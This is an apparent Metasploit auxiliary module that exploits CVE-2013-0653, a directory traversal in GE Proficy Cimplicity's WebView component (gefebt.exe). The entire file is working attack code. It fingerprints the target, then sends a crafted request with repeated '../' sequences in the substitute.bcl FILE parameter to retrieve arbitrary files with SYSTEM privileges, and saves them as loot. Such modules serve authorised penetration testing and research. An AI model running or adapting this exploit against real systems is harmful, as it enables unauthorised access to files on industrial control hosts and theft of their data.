##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'uri'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'GE Proficy Cimplicity WebView substitute.bcl Directory Traversal',
        'Description' => %q{
          This module abuses a directory traversal in GE Proficy Cimplicity, specifically on the
          gefebt.exe component used by the WebView, in order to retrieve arbitrary files with SYSTEM
          privileges. This module has been tested successfully on GE Proficy Cimplicity 7.5.
        },
        'Author' => [
          'Unknown', # Vulnerability discovery
          'juan vazquez' # Metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          [ 'CVE', '2013-0653' ],
          [ 'OSVDB', '89490' ],
          [ 'BID', '57505' ],
          [ 'URL', 'http://ics-cert.us-cert.gov/advisories/ICSA-13-022-02' ]
        ],
        'DisclosureDate' => '2013-01-22',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        Opt::RPORT(80),
        OptString.new('TARGETURI', [true, 'Path to CimWeb', '/CimWeb']),
        OptString.new('FILEPATH', [true, 'The name of the file to download', '/windows\\win.ini']),
        # By default gefebt.exe installed on C:\Program Files\GE Fanuc\Proficy CIMPLICITY\WebPages\CimWeb
        OptInt.new('DEPTH', [true, 'Traversal depth', 5])
      ]
    )
  end

  def normalize_uri(*strs)
    new_str = strs * '/'

    new_str = new_str.gsub!('//', '/') while new_str.index('//')

    # Makes sure there's a starting slash
    unless new_str[0, 1] == '/'
      new_str = '/' + new_str
    end

    new_str
  end

  def target_uri
    # In case TARGETURI is empty, at least we default to '/'
    u = datastore['TARGETURI']
    u = '/' if u.nil? || u.empty?
    URI(u)
  rescue ::URI::InvalidURIError
    print_error "Invalid URI: #{datastore['TARGETURI'].inspect}"
    raise Msf::OptionValidateError, ['TARGETURI']
  end

  def my_basename(filename)
    return ::File.basename(filename.gsub('\\', '/'))
  end

  def is_proficy?
    connect
    req = "GET #{normalize_uri(target_uri.path, 'index.html')} HTTP/1.0\r\n\r\n"
    sock.put(req)
    res = sock.get_once
    disconnect

    return false unless res

    res.to_s.include?('gefebt.exe')
  end

  # We can't use the http client msf mixin because the Proficy Web server
  # return a malformed HTTP response with the file contents, there aren't
  # two new lines (but one) between the HTTP headers and the body content.
  def read_file(file)
    travs = ''
    travs << '../' * datastore['DEPTH']
    travs << file

    print_status("#{@peer} - Retrieving file contents...")

    connect
    req = "GET #{normalize_uri(target_uri.path, 'gefebt.exe')}?substitute.bcl+FILE=#{travs} HTTP/1.0\r\n\r\n"
    sock.put(req)
    res = sock.get_once
    disconnect

    return unless res

    if res =~ %r{HTTP/1\.0 200 OK}
      return res
    else
      return nil
    end
  end

  def run
    @peer = "#{rhost}:#{rport}"

    print_status("#{@peer} - Checking if it's a GE Proficy Application...")

    unless is_proficy?
      print_error("#{@peer} - GE proficy not found")
      return
    end

    print_good("#{@peer} - Check successful")

    contents = read_file(datastore['FILEPATH'])
    if contents.nil?
      print_error("#{@peer} - File not downloaded")
      return
    end

    file_name = my_basename(datastore['FILEPATH'])
    path = store_loot(
      'ge.proficy.traversal',
      'application/octet-stream',
      rhost,
      contents,
      file_name
    )
    print_good("#{rhost}:#{rport} - File saved in: #{path}")
  end
end
